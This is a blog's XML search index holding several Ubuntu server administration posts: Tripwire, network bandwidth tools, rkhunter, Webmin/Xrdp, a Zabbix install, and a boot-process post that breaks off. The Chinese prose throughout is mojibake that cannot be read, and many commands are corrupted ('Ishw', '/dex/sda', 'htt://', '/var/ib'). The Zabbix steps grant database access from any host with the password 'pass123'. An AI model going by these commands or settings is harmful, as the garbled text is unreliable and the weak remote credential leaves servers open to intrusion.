è¦æ³¨é‡Šæ‰€æœ‰ä¸å­˜åœ¨çš„æ–‡ä»¶/ç›®å½• sudo twadmin -m P /etc/tripwire/twpol.txt # ç„¶ååŸºäºä¿®æ”¹ä¹‹åçš„ç­–ç•¥æ–‡ä»¶ï¼Œé‡æ–°ç”Ÿæˆpolæ–‡ä»¶ sudo tripwire --init #é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ æ£€æŸ¥éªŒè¯ sudo tripwire --check # æ£€æŸ¥ # æŸ¥çœ‹éªŒè¯ç»“æœ æ·»åŠ è§„åˆ™ vi /etc/tripwire/twpol.txt # Rules for Project { rulename = "Project Ruleset", severity = $(SIG_ HI) } { /project -> $(SEC CRIT); } sudo twadmin -m P /etc/tripwire/twpol.txt # å…ˆåˆ›å»ºä¸Šé¢ç­–ç•¥æ–‡ä»¶ä¸­çš„æ–‡ä»¶ï¼Œå¦åˆ™ä¼šæŠ¥é”™æ–‡ä»¶ä¸å­˜åœ¨ # é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ sudo tripwire --init åŸºäºä¸Šæ¬¡æœ€æ–°çš„æ£€æŸ¥æ—¥å¿—(å¢é‡å‹çš„æ–¹å¼)ï¼Œæ¥è¿›è¡Œæ›´æ–° ##æ›´æ–°æ•°æ®åº“(æœ¬åœ°ç³»ç»Ÿæ›´æ–°) ll /var/lib/tripwire/report # æ¯æ¬¡æ•°æ®åº“å˜æ›´éƒ½è¦æ‰§è¡Œä¸€æ¬¡ tripwire -mu-a -S -C /etc/tripwire/tw.cfg -r /var/ib/tripwire/report/xps.twr # æˆ–è€…ä½¿ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼ï¼Œä¸€æ¬¡æ‰§è¡Œå³å¯ tripwire --update -- accept-all ## æŸ¥çœ‹æŠ¥å‘Šï¼ˆr è¯»å–ã€‚è¿™æ ·çš„æ–¹æ³•æ›´åŠ è¯¦ç»†ï¼‰ twprint -m r -F /var/lib/tripwire/report/xps-2020801-100037.twr ## æŸ¥çœ‹æ•°æ®åº“(d æ•°æ®ã€‚å†…å®¹å¾ˆå¤š) twprint -m d -d /path/to/database.twd è¡¥å……å‘½ä»¤ç¡¬ä»¶ä¿¡æ¯ # å®‰è£… sudo apt install Ishw # æŸ¥çœ‹ sudo lshw # è¾“å‡ºç»“æœ sudo lshw -html > hwinfo .html ç¡¬ç›˜ä¿¡æ¯ # å®‰è£… sudo apt install hdparm hdparm -i /dev/sda hdparm -I /dex/sda # æ›´åŠ è¯¦ç»†ä¿¡æ¯ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>IDS</tag>
        <tag>Tripwire</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-ç½‘ç»œå·¥å…·]]></title>
    <url>%2Fposts%2F63455%2F</url>
    <content type="text"><![CDATA[ç½‘ç»œå¸¦å®½ å¼€æµ‹è¯•é˜²ç«å¢™æ€§èƒ½NetIO å…‰çº¤ä¸“çº¿çš„å¸¦å®½æ˜¯å¦ç¼©æ°´ å®é™…æ‰¿å—çš„æµé‡ iperf3 æ¨¡æ‹Ÿå‡ºæ¥çš„æµé‡å¹¶éçœŸå®å¸¦å®½ æµ‹è¯•ç½‘ç»œå¸¦å®½iperf3 æ”¯æŒTCP/SCTP/UDPåè®® è·¨å¹³å° å¤šè¿æ¥(æ¨¡æ‹Ÿå¤šç”¨æˆ·) æ”¯æŒIPv6 å®‰è£… # æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½æ˜¯è¿™ä¸€ä¸ªè½¯ä»¶åŒ… apt install iperf3 # é»˜è®¤ä¾¦å¬ç«¯å£ï¼š5201 å‚æ•° # iperf3 -p, --port # server port to listen on/connect to -f, --format #[kmgKMG] format to report: Kbits, Mbits, KBytes, MBytes -i, --interval # seconds between periodic bandwidth reports -F, --file name # xmit/recv the specified fileï¼Œ æŒ‡å®šæ–‡ä»¶æ‰“åˆ°å¯¹æ–¹ -A, --affinity n/n,m set CPU affinity -B, --bind &lt;host> bind to a specific interface -V, --verbose more detailed output -J, --json output in JSON format --logfile f send output to a log file -d, --debug emit debugging output -v, --version show version information and quit -h, --help show this message and quit Server specific: -s, --server run in server mode -D, --daemon run the server as a daemon # åå°è¿è¡Œ -I, --pidfile file write PID file -1, --one-off handle one client connection then exit # åªæ¥æ”¶ç¬¬ä¸€ä¸ªå®¢æˆ·ç«¯çš„æµ‹è¯• Client specific: -c, --client &lt;host> run in client mode, connecting to &lt;host> -u, --udp #use UDP rather than TCP -b, --bandwidth #[KMG][/#] target bandwidth in bits/sec (0 for unlimited) # é™åˆ¶æµé‡å¸¦å®½ (default 1 Mbit/sec for UDP, unlimited for TCP) (optional slash and packet count for burst mode) -t, --time # time in seconds to transmit for (default 10 secs) # æµ‹è¯•æ—¶é•¿(é»˜è®¤10s) -n, --bytes #[KMG] number of bytes to transmit (instead of -t) -k, --blockcount #[KMG] number of blocks (packets) to transmit (instead of -t or -n) -l, --len #[KMG] length of buffer to read or write (default 128 KB for TCP, 8 KB for UDP) --cport &lt;port> bind to a specific client port (TCP and UDP, default: ephemeral port) -P, --parallel # number of parallel client streams to run # å¹¶å‘æ•°é‡ -R, --reverse run in reverse mode (server sends, client receives) -w, --window #[KMG] set window size / socket buffer size -C, --congestion &lt;algo> set TCP congestion control algorithm (Linux and FreeBSD only) -M, --set-mss # set TCP/SCTP maximum segment size (MTU - 40 bytes) -N, --no-delay set TCP/SCTP no delay, disabling Nagle's Algorithm -4, --version4 only use IPv4 -6, --version6 only use IPv6 -S, --tos N set the IP 'type of service' -L, --flowlabel N set the IPv6 flow label (only supported on Linux) -Z, --zerocopy use a 'zero copy' method of sending data -O, --omit N omit the first n seconds -T, --title str prefix every output line with this string --get-server-output get results from server --udp-counters-64bit use 64-bit counters in UDP test packets --no-fq-socket-pacing disable fair-queuing based socket pacing ä½¿ç”¨ # ä½œä¸ºæœåŠ¡ç«¯ iperf3 -s # ä½œä¸ºå®¢æˆ·ç«¯ï¼Œè¿æ¥æœåŠ¡ç«¯ iperf3 -c 192.168.0.111 æŸ¥çœ‹å½“å‰å¸¦å®½å ç”¨1.nloadé¡»åœ¨é—®é¢˜å‘ç”Ÿå½“ä¸‹æ‰§è¡Œå‘½ä»¤ # å®‰è£… apt install nload # ä½¿ç”¨ sudo nload nload -uk -U m enp0s3 # æŸ¥çœ‹æŒ‡å®šç½‘å¡æµé‡ï¼ˆå¦‚æœä¸æŒ‡å®šä¼šè‡ªåŠ¨æŸ¥æ‰¾ç½‘å¡ï¼‰ nload -m # åŒæ—¶æŸ¥çœ‹å¤šç½‘å¡æµé‡ 2.iftop ä¼˜ç‚¹ï¼šä¼šæ˜¾ç¤ºæµé‡é€šä¿¡ä¹‹é—´çš„ä¸»æœºåŒæ–¹ # å®‰è£… apt install iftop # è¿è¡Œ sudo iftop sudo iftop -n -N # ä¸è§£æåŸŸåã€ç«¯å£ï¼ˆä»¥ipåœ°å€å½¢å¼æ˜¾ç¤ºé€šä¿¡åŒæ–¹ï¼‰ # å…¶ä»–å‚æ•° -p # æ··æ‚æ¨¡å¼ï¼ˆå‡¡æ˜¯æµç»ä½ ç½‘å¡çš„æµé‡éƒ½ä¼šè¢«æ¢æµ‹ï¼‰ -i eth0 # æŒ‡å®šç½‘å¡ 3.iptraf # å®‰è£…ä¸¤ä¸ªè½¯ä»¶åŒ… sudo apt install iptraf iptraf-ng sudo iptraf-ng # å­—ç¬¦èœå•æ–¹å¼å±•ç¤º # é€‰æ‹©ï¼Œé«˜äº®æ˜¾ç¤ºï¼Œè¯¦ç»†ä¿¡æ¯ï¼Œé…ç½®... 4. nethogså¯æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹æ‰€ä½¿ç”¨çš„å¸¦å®½ # äº§ç”Ÿå¤§æµé‡ä¸ä¸€å®šæ˜¯ç—…æ¯’ # å®‰è£… sudo apt install nethogs å…¶ä»–å·¥å…·â€‹ â€¦. â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå·¥å…·</tag>
        <tag>ubuntu</tag>
        <tag>å¸¦å®½ç›‘æµ‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Rkhunter]]></title>
    <url>%2Fposts%2F53417%2F</url>
    <content type="text"><![CDATA[è°£è¨€ Linuxç³»ç»Ÿå¾ˆå®‰å…¨ï¼Œä»ä¸æ„ŸæŸ“ç—…æ¯’ å·²çŸ¥çš„æ¶æ„è½¯ä»¶æ²¡æœ‰Windowsç³»ç»Ÿå¤š Rootkit éšè—è‡ªèº«èƒ½åŠ›è¶…å¼ºçš„æ¶æ„è½¯ä»¶(ä¸€ ä¸ªæˆ–ä¸€ç»„) å°†è‡ªèº«æ³¨å…¥ä¸»æ¿èŠ¯ç‰‡ã€ç¡¬ç›˜å¼•å¯¼æ‰‡åŒºã€ç³»ç»Ÿå†…æ ¸ã€åº•å±‚é©±åŠ¨ è¿è¡Œçº§åˆ«ä¼˜å…ˆäºç³»ç»Ÿæˆ–é©»ç•™äºå†…æ ¸ç‰¹æƒå±‚çº§ éš¾äºå‘ç°ã€éš¾äºæ¸…é™¤ã€æ›´æ¢ç¡¬ä»¶éƒ½æ— æ³•æ¸…é™¤ æœ€æ—©æ˜¯å‡ºç°åœ¨Unixç³»ç»Ÿä¸Šçš„ä¸€ç±»æ­£å‘æŠ€æœ¯ æœ‰æ—¶æœ¨é©¬ç¨‹åºä¹Ÿå¯è§†ä¸ºRootkit çš„ä¸€ç§ Rootkit Hunter å®‰å…¨ç›‘è§†å’Œåˆ†æå·¥å…·(éå¤„ç½®å‹å·¥å…·) æ£€æµ‹Rootkitã€æ¶æ„è½¯ä»¶ã€ä¸å®‰å…¨è®¾ç½®ã€æ–‡ä»¶å®Œæ•´æ€§ã€å¯ç–‘ç«¯å£ åŸºäºç‰¹å¾åŒ¹é… è„šæœ¬(è°ƒç”¨å…¶ä»–é€šç”¨å·¥å…·å®Œæˆæ£€æµ‹ä»»åŠ¡) è¿è¡Œæ–¹å¼ éœ€è¦è¦rootæƒé™ åªèƒ½è¿è¡ŒäºBourneç±»å‹çš„shell (bashã€ ksh) æ‰‹åŠ¨è¿è¡Œã€cron job å®‰è£… sudo apt install rkhunter # æŒ‰ç…§å‘å¯¼å³å¯ é…ç½® sudo vi /etc/default/rkhunter CRON DAILY_RUN="true" # æ¯å¤©è‡ªåŠ¨è¿è¡Œæ¥æ£€æŸ¥ç³»ç»Ÿ CRON_ DB_ UPDATE="true" # è¿™é‡Œç®€å•ä¿®æ”¹å‡ é¡¹ å‡çº§ç‰¹å¾åº“ sudo rkhunter --propupd æ‰§è¡Œæ£€æŸ¥ # é»˜è®¤å¯¹ç³»ç»Ÿæ‰€æœ‰æ£€æŸ¥é¡¹è¿›è¡Œï¼ˆæ¯ä¸€é¡¹éƒ½éœ€è¦å›è½¦ç¡®è®¤ï¼Œ--skå°±ä¸ç”¨æ‰‹åŠ¨æ•²å›è½¦äº†ï¼‰ sudo rkhunter --check --sk # æ£€æŸ¥ç»“æœå¦‚æœæ˜¾ç¤ºæ˜¯ç»¿è‰²çš„ï¼ŒåŸºæœ¬å°±æ²¡å•¥é—®é¢˜ æ—¥å¿—æ–‡ä»¶ # var/log/rkhunter.log less var/log/rkhunter.log è¯¯æŠ¥ç™½åå• sudo vi /etc/rkhunter.conf SCRIPTWHITELIST=/usr/bin/egrep SCRIPTWHITELIST=/usr/bin/fgrep SCRIPTWHITELIST=/usr/bin/ldd document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Rkhunter</tag>
        <tag>å®‰å…¨æ£€æŸ¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-è¿œç¨‹ç®¡ç† Webmin&usermin&Xrdp]]></title>
    <url>%2Fposts%2F40012%2F</url>
    <content type="text"><![CDATA[Webmin åŸºäºWEBçš„ç³»ç»Ÿè¿œç¨‹ç®¡ç† åŸºäºå›¾å½¢åŒ–çš„å‹å¥½æ“ä½œç•Œé¢ å¤šå¼€å¯ä¸€ä¸ªæœåŠ¡ç«¯å£ï¼Œå¢åŠ äº†æ”»å‡»é¢ Webmin WEBåº”ç”¨ç¨‹åºï¼Œå®Œæˆéƒ¨åˆ†æœåŠ¡å™¨æ—¥å¸¸ç®¡ç†æ“ä½œ å®‰è£…ä¾èµ–åŒ…apt -y install python apt-show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl ä¸‹è½½å®‰è£…# ä¸‹è½½å®‰è£… curl -L -O htt://www.webmin.com/download/deb/webmin-current.deb dpkg -i webmin-current.deb # å®‰è£… # é…ç½®å…è®¸è®¿é—®çš„ipï¼ˆè¿™é‡Œé…ç½®æœ¬åœ°åœ°å€ å’Œ æŸä¸ªç½‘æ®µï¼‰ vi /etc/webmin/miniserv.conf allow=127.0.0.1 10.0.0.0/24 # é‡å¯æœåŠ¡ systemctl restart webmin è®¿é—®# è®¿é—® https://10.1.1.1:10000 # ä½¿ç”¨ç³»ç»Ÿè´¦å·ç™»å½•ï¼Œå»ºè®®root ## ç®¡ç†ç³»ç»Ÿ å¦‚æœå¤šå°æœåŠ¡å™¨ï¼Œå¯ä»¥ç”¨"å¹¿æ’­æœåŠ¡å™¨"æ¥å¯»æ‰¾å…¶ä»–è£…äº†Webminçš„æœåŠ¡å™¨ï¼Œåœ¨ä¸€ä¸ªwebç«¯æ¥ç»Ÿä¸€ç®¡ç† userminæ™®é€šç”¨æˆ·è‡ªæœåŠ¡usermin å®‰è£…ä¾èµ–åŒ… apt -y install python apt- -show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl å®‰è£… curl -L -0 http:/ /www.webmin.com/download/ deb/usermin-current.deb dpkg -i usermin-current.deb vi /etc/usermin/ miniserv.conf allow=127.0.0.1 10.0.0.0/24 denyuser=root # ç¦æ­¢rootç™»å½•usermin systemctl restart usermin è®¿é—® https://10.0.1.12:20000 # Xrdpè¿œç¨‹æ¡Œé¢ VNC vs XRDP ä½¿ç”¨Windowsè¿œç¨‹æ¡Œé¢è¿æ¥å·¥å…·è¿œç¨‹ç®¡ç†Linux Server å›¾å½¢åŒ–æ¡Œé¢ä½œä¸ºåæ®µ Gnomeã€ KDEã€Xfce (è¶Šæ¥è¶Šç«) å®‰è£…Xfceæ¡Œé¢ç¯å¢ƒ # ä»¥Xfceä¸ºä¾‹ sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils å®‰è£…XRDP sudo apt install xrdp é…ç½® sudo vi /etc/xrdp/xrdp.ini exec startxfce4 # è¿™é‡Œæ˜¯xfce4 é‡å¯æœåŠ¡ sudo systemctl restart xrdp é˜²ç«å¢™ sudo ufw allow 3389 sudo ufw allow from 10.0.0.0/24 to any port 3389 # å¯ä»¥é™åˆ¶æ¥æºipåœ°å€ è¿æ¥ ç”¨Windowsçš„è¿œç¨‹è¿æ¥å·¥å…·(mstsc)è¿æ¥LinuxæœåŠ¡å™¨ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>è¿œç¨‹ç®¡ç†</tag>
        <tag>Webmin</tag>
        <tag>usermin</tag>
        <tag>Xrdp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Zabbix]]></title>
    <url>%2Fposts%2F60461%2F</url>
    <content type="text"><![CDATA[Zabbix â€“ æœ€æµè¡Œçš„å¼€æºçš„ä¼ä¸šçº§ç›‘æ§ç³»ç»Ÿä¹‹ä¸€ åŸºæœ¬å¯å¯¹å…¨å¹³å°ï¼Œå…¨ç³»ç»Ÿåšç›‘æ§ï¼šç½‘ç»œè®¾å¤‡ã€æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åº Unixã€L inuxã€Windowsã€MacOS ç›‘æ§æ–¹å¼ï¼šAgent(ç¡¬ä»¶è®¾å¤‡,è¢«ç›‘æ§æœºå™¨ä¸Šå®‰è£…ï¼Œè‡ªå·±çš„ä½œä¸ºZabbixæœåŠ¡å™¨) / Agenless ç³»ç»Ÿç¯å¢ƒ ä¿®æ”¹ï¼šIP(é™æ€)ã€Hostnameã€ DNSã€NTP`bashä¿®æ”¹ä¸»æœºåvim /etc/cloud/cloud.cfg preserve_hostnameï¼›true vim /etc/hostname zab.lab.com # ä½œä¸ºzabbixæœåŠ¡å™¨ åŸŸåè§£æ10.1.8.132 zab.lab.com é‡å¯zabbixæœåŠ¡å™¨ #### å®‰è£…&amp;é…ç½® ###### 1.å®‰è£…é…ç½®Apache ```bash # ç®¡ç†æ˜¯Webç•Œé¢ï¼Œåœ¨ZabbixæœåŠ¡å™¨æœºå™¨ä¸Š apt install apache2 vim /etc/apache2/conf-enabled/security.conf ServerTokens Prod # æ˜¾ç¤ºæœ€å°‘çš„ä¸»æœºå¤´ä¿¡æ¯ vim /etc/apache2/apache2.conf ServerName zab.lab.com # ä¸»æœºå vim /etc/apache2/sites-enabled/000-default.conf ServerAdmin webmaster@lab.com # é‡å¯æœåŠ¡ systemctl restart apache2 2.å®‰è£…phpapt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring # å¯åŠ¨æ¨¡å— a2enconf php7.2-cgi systemctl reload apache2 vi /etc/php/7.2/apache2/php.ini date.timezone = "Asia/Shanghai" # æµ‹è¯•é¡µé¢ vi /ar/www/htm/index.php &lt;html> &lt;body> &lt;?php print "PHP Test"; ?>&lt;/body>&lt;/html> 3.å®‰è£…MySQLapt install mariadb-server mysql_secure_installation # å®‰å…¨åˆå§‹åŒ– mysql CREATE DATABASE zabbix_db CHARACTER SET utf8 collate utf8 bin; grant all privileges on zabbix_db.* to zabbix@'localhost' identified by 'pass123'; grant all privileges on zabbix_db.* to zabbix@'%' identified by 'pass123'; flush privileges; 4.å®‰è£…Zabbix# ä¸‹è½½é€‚åˆubuntuå‘è¡Œç‰ˆæœ¬(è¿™é‡Œæ˜¯bionic)çš„äºŒè¿›åˆ¶åŒ…ï¼ˆæ ¹æ®è‡ªå·±çš„ä¸‹è½½ï¼‰ wget https://repo.zabbix.com/zabbix/4.0/ubuntu/ pool/main/z/zabbix-release/zabbix-release_ 4.0-3+bionic_ all.deb apt install ./zabbix-release_4.0-3+bionic_all.deb &amp;&amp; apt update # dpkg -i xx ä¹Ÿå¯ï¼›å¢åŠ äº†ä¸€æ¡zabbixå®˜æ–¹æºçš„æ–‡ä»¶ sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-agent # è¿™é‡Œzabbix-agentå®‰è£…æ˜¯å› ä¸ºæŠŠzabbix-serverè‡ªå·±ä¹Ÿçº³å…¥ç›‘è§†èŒƒå›´ zcat /usr/share/doc/ zabbix- server-mysql/create.sql.gz | mysql -u zabbix -p zabbix_db # zcat å¯ä»¥æŸ¥çœ‹å‹ç¼©æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼›åˆå§‹åŒ–è¡¨ç»“æ„ # ä¿®æ”¹zabbixæœåŠ¡ç«¯é…ç½®æ–‡ä»¶ä¸­æ•°æ®åº“è¿æ¥å¯†ç  vi /etc/zabbix/zabbix_server.conf DBName=zabbix_db DBUser=zabbix DBPassword=pass123 # é‡å¯æœåŠ¡ systemctl restart zabbix-server 5.é…ç½®Zabbix# é…ç½®agentï¼ˆè¿™é‡Œæ˜¯æœåŠ¡ç«¯ç›‘è§†è‡ªå·±çš„agentï¼‰ vi /etc/zabbix/zabbix_agentd.conf Hostname= zab.lab.com # è®©ä»–æ‰¾åˆ°æˆ‘ä»¬çš„zabbix serverçš„åœ°å€ # é‡å¯ systemctl restart zabbix-agent systemctl enable zabbix-server # å¼€æœºè‡ªå¯ vi /etc/ apache2/conf-enabled/zabbix.conf Allow from 10.0.0.10/24 # è®¾ç½®è°èƒ½è®¿é—®æˆ‘zabbixçš„ç®¡ç†é¡µé¢ # é‡å¯apache systemctl restart apache2 6.è®¿é—®Web&amp;åˆå§‹åŒ–# htp://zab.lab.com/zabbix/ # è®¾ç½®æ•°æ®åº“è¿æ¥å‚æ•° DB Password Hostname # ç™»é™†: Admin / zabbix # ä¿®æ”¹å¯†ç  # æ·»åŠ ç›‘è§†çš„ä¸»æœºï¼ˆagentæ¨¡å¼ä¸‹ï¼Œç›®æ ‡ç«¯å£è¦å¼€ï¼‰ è‡³æ­¤ï¼ŒzabbixæœåŠ¡ç«¯å·²ç»é…ç½®å®Œæ¯• 7.åœ¨è¢«ç›‘æ§æœåŠ¡å™¨ä¸Šå®‰è£…é…ç½®agent## å®‰è£… wget hts://repo.zabbix.com/zabbix/4.0/ubuntu/pool/main/z/zabbix-release/zabbix-release.4.0-3+bionic.all.deb sudo apt install ./zabbix-release_4.0-3+bionic.all.deb sudo apt update sudo apt install zabbix-agent # å®‰è£…zabbix-agent # ä¿®æ”¹agentæœåŠ¡å™¨çš„ä¸»æœºå å’Œ DNSåŸŸåè§£æ # PSK / CAåŠ å¯†æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„é€šä¿¡ ## é…ç½® vi /etc/zabbix/zabbix_agentd.conf Server=zab.lab.com # æŒ‡å‘zabbix-server ServerActive=zab.lab.com Hostname= zab.lab.com TLSConnect=psk # è¿™é‡Œè®¾ç½®pskåŠ å¯†çš„å‚æ•° TLSAccept=psk TLSPSKIdentity=PSK 001 # IDå¿…é¡»å”¯ä¸€ TLSPSKFile=/etc/zabbix/zabbix_agentd.psk # éšæœºç”Ÿæˆæ–‡ä»¶å†…å®¹ pskçš„å€¼ openssl rand -hex 32 | sudo tee /etc/zabbix/zabbix_agentd.psk sudo systemctl start zabbix-agent sudo systemctl enable zabbix-agent 8.æœåŠ¡ç«¯æ·»åŠ agent# Webç•Œé¢ Configuration -> Hosts -> Create host -> ... -> Template(æŒ‡å®šç›‘è§†ç›®æ ‡çš„ä»€ä¹ˆæœåŠ¡) -> Security(éƒ½é€‰æ‹©PSK, agentçš„id, pskçš„å€¼) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Zabbix</tag>
        <tag>ç›‘æ§</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å¼•å¯¼è¿‡ç¨‹]]></title>
    <url>%2Fposts%2F24845%2F</url>
    <content type="text"><![CDATA[BIOS/UEFI æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ æ“ä½œç³»ç»Ÿæ˜¯å¦‚ä½•å¯åŠ¨çš„ ä¸‰ä¸ªå½¼æ­¤ç‹¬ç«‹ä½†ç›¸äº’å…³è”çš„è¿‡ç¨‹1.Bios/UEFIè‡ªæ£€è¿‡ç¨‹ï¼ˆPOSTï¼‰ - åŠ ç”µè‡ªæ£€ - ç¡¬ä»¶è¯†åˆ«ä¸æ£€æµ‹ # UEFIæ¯”è¾ƒæ–°ï¼ŒåŸç†å’Œæ•ˆæœä¸ä¸€æ · 2.Boot LoadåŠ è½½æ‰§è¡Œè¿‡ç¨‹ å¼•å¯¼åŠ è½½ç¨‹åºå…è®¸æ‚¨é€‰æ‹©æƒ³è¦å¼•å¯¼çš„æ“ä½œç³»ç»Ÿ 3.æ“ä½œç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ å¯åŠ¨å„ç§æœåŠ¡åŠæ“ä½œç³»ç»Ÿæœ¬èº« BIOS æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ ä¸»æ¿èŠ¯ç‰‡ï¼ˆè®¡ç®—æœºè¿è¡Œçš„ç¬¬ä¸€ä¸ªç¨‹åºï¼‰ - æ‰§è¡ŒåŸºæœ¬çš„æ£€æŸ¥æˆ–å¼€æœºè‡ªæµ‹(POST) - è¯†åˆ«è¿æ¥åœ¨è®¡ç®—æœºä¸Šçš„æ‰€æœ‰ç¡¬ä»¶ã€å¯ç”¨æ€§ã€åº•å±‚å‚æ•° ä¾‹å¦‚å†…å­˜ã€ç¡¬ç›˜ã€é”®ç›˜å’Œæ˜¾å¡ç­‰ - ä¸åŒçš„BIOSå¯ä»¥è®¾ç½®æ£€æŸ¥å‚æ•° - è½®è®­ç¡¬ç›˜æ§åˆ¶å™¨ï¼Œå¯åŠ¨å…¶æ¿è½½èŠ¯ç‰‡ï¼Œé…ç½®RAIDç­‰ - å¼•å¯¼é¡ºåº - ä¸å½“çš„é…ç½®å¯å¯¼è‡´è®¡ç®—æœºæ— æ³•ä½¿ç”¨ UEFI æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ è¾ƒæ–°çš„ä¸»æ¿æ”¯æŒUEFI (2015å¹´ä»¥å) - è§†è§‰ä¸Šä¸BIOSç›¸ä¼¼ï¼Œä½†åŸç†æä¸ç›¸åŒ - è¿è¡Œé€Ÿåº¦ç•¥å¿«äºBIOS - åˆ›å»ºUEFIæ˜¯ä¸ºäº†å…‹æœBIOSçš„æ•…æœ‰ç¼ºé™· - BIOSè¿è¡ŒåŸºäº16ä½å¤„ç†å™¨ï¼ŒUEFIåŸºäºç°ä»£å¤„ç†å™¨ - å†…å­˜ä½¿ç”¨é‡æ–¹é¢ï¼ŒBIOSæœ‰ é™ï¼ŒUEFIæŒ‰éœ€è¦é‡ä½¿ç”¨ - BIOSåªèƒ½è¯»å–MBRå¼•å¯¼æ“ä½œç³»ç»Ÿ; UEFIå¯è¯»å–ç³»ç»Ÿå®‰è£…æ—¶åˆ’åˆ†çš„ç‹¬ç«‹åˆ†åŒº - BIOSæ”¯æŒæœ€å¤§2Tçš„ç¡¬ç›˜ï¼ŒUEFIä½¿ç”¨GPTåˆ†åŒºè¡¨ï¼Œæœ€å¤§æ”¯æŒ8-9Zç¡¬ç›˜ å®‰å…¨å¼•å¯¼(Secure-boot) æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ - æ¶æ„è½¯ä»¶å¯é€šè¿‡Boot LoaderåŠ è½½åˆ°ç³»ç»Ÿä¸­ - UEFIæä¾›äº†å®‰å…¨å¼•å¯¼ Secure-boot - åŠ è½½å‰é€šè¿‡å…¬é’¥/ç§é’¥éªŒè¯ç­¾åçš„å¼•|å¯¼åŠ è½½ç¨‹åºå’Œç¡¬ä»¶ - 64ä½æ“ä½œç³»ç»Ÿæ”¯æŒSecure-boot,æŸäº›ç¡¬ä»¶æ— æ³•æ›´æ”¹æ“ä½œç³»ç»Ÿç±»å‹ï¼ˆå¦‚æŸäº›ç”µè„‘å‚å•†ä¸è®©ç”µè„‘è£…å…¶ä»–ç³»ç»Ÿï¼Œä»–ç»™é”æ­»äº†ï¼Œè¦é—®å¥½Secure-bootèƒ½ä¸èƒ½å…³æˆ–åœ¨å¼€å¯Secure-bootæ—¶å€™èƒ½ä¸èƒ½æŒ‰å…¶ä»–ç³»ç»Ÿã€‚å…¶å®å»ºè®®Secure-bootå¼€å¯ï¼‰ - ç›®å‰ç»å¤§å¤šæ•°ç¡¬ä»¶åŒæ—¶æ”¯æŒBISO/UEFIï¼Œå¯è‡ªè¡Œé€‰æ‹©å¯åŠ¨ ç¡¬ç›˜åˆ†åŒºè¡¨ æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ - åˆ†åŒºè¡¨é€šå¸¸ä½äºç¡¬ç›˜èµ·å§‹ä½ç½® - è®°å½•ç¡¬ç›˜çš„åˆ’åˆ†æƒ…å†µ - ä¸¤ç§ç±»å‹ï¼šMBR / GPT Boot Loader æ‰“å¼€é»‘ç®±çœ‹çœ‹é‡Œé¢ BIOS/UEFIä¸å…³ç³»ç»Ÿå®‰è£…çš„æ“ä½œç³»ç»Ÿ POSTè‡ªæ£€ç»“æŸåï¼ŒBIOS/UEFIè¯»å–ç¡¬ç›˜Boot Loader è¯»å–å¹¶æ‰§è¡ŒBoot L oderï¼Œç”±å…¶å¼•|å¯¼æ“ä½œç³»ç»Ÿ Linuxä¸–ç•Œé‡Œä¸¤å¤§Boot Loaderç¨‹åº 